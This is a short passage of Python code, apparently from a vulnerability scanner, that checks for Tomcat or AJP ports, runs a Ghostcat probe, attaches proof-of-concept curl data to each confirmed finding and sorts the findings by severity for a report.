    has_tomcat = any(p.port in (8080, 8443) or p.service in ("http-alt", "https-alt")
                     for p in ports)
    if 8009 in all_port_nums or has_tomcat:
        ghostcat = probe_ghostcat(target, 8009, timeout=timeout)
        if ghostcat:
            result.confirmed.append(ensure_probe_poc(ghostcat, target, 8009, "http"))
            result.probes_run += 1

    # Final safety: every confirmed finding must carry a PoC for report export.
    for f in result.confirmed:
        if not (f.poc and f.poc.get("curl")):
            ensure_probe_poc(f, target, 80, "http")

    result.confirmed.sort(key=lambda f: _SEV_ORDER.get(f.severity, 5))
    return result
